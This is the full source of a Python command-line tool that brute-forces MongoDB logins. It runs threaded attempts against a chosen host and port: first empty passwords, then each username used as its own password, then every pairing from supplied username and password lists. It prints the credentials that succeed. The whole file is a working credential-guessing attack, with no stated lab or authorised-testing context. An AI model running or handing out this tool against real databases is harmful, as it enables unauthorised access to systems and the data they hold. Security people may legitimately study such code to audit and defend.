import pymongo
from pymongo.errors import ConnectionFailure, OperationFailure, InvalidURI, ConfigurationError
import threading
import argparse
import urllib.parse

# Attempt to connect to MongoDB with given credentials
def attempt_mongo_login(host, port, username, password, db_name="admin"):
    # URL-encode the username and password
    encoded_username = urllib.parse.quote_plus(username)
    encoded_password = urllib.parse.quote_plus(password) if password else ""
    # Add directConnection=true to the URI to avoid replica set member search
    uri = f"mongodb://{encoded_username}:{encoded_password}@{host}:{port}/{db_name}?directConnection=true"

    client = None
    try:
        client = pymongo.MongoClient(uri, serverSelectionTimeoutMS=5000)
        client.admin.command('ping')  # Check if the password is correct
        print(f"[+] Success: {username}:{password}")
        return True
    except (ConnectionFailure, OperationFailure, InvalidURI, ConfigurationError):
        # Print only the failed password attempt for cleaner output
        print(f"[-] Failed: {username}:{password}")
        return False
    finally:
        if client is not None:
            client.close()

# Load usernames and passwords from files
def load_list(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f]

def main(host, port, username_file, password_file):
    usernames = load_list(username_file)
    passwords = load_list(password_file)
    found_credentials = []

    lock = threading.Lock()

    # Function to attempt login and store successful credentials
    def try_login(username, password):
        if attempt_mongo_login(host, port, username, password):
            with lock:
                found_credentials.append((username, password))

    # Step 1: Try each username with an empty password
    print("[*] Trying each username with an empty password")
    threads = []
    for username in usernames:
        t = threading.Thread(target=try_login, args=(username, ""))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    # Step 2: Try each username with username as the password
    print("[*] Trying each username with username as the password")
    threads = []
    for username in usernames:
        t = threading.Thread(target=try_login, args=(username, username))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    # Step 3: Brute-force each username with every password in the list
    print("[*] Starting brute-force with each username and each password")
    threads = []
    for password in passwords:
        for username in usernames:
            t = threading.Thread(target=try_login, args=(username, password))
            threads.append(t)
            t.start()
        # Join threads in batches to control the number of concurrent threads
        for t in threads:
            t.join()
        threads = []

    # Output the results
    if found_credentials:
        print("[*] Brute-force complete. Credentials found:")
        for username, password in found_credentials:
            print(f" - {username}:{password}")
    else:
        print("[*] Brute-force complete. No valid credentials found.")

if __name__ == "__main__":
    # Argument parser setup
    parser = argparse.ArgumentParser(description="MongoDB brute-force script")
    parser.add_argument("-H", "--host", required=True, help="MongoDB server IP address")
    parser.add_argument("-P", "--port", type=int, default=27017, help="MongoDB server port")
    parser.add_argument("-U", "--username_file", required=True, help="File containing list of usernames")
    parser.add_argument("-W", "--password_file", required=True, help="File containing list of passwords")

    args = parser.parse_args()
    main(args.host, args.port, args.username_file, args.password_file)
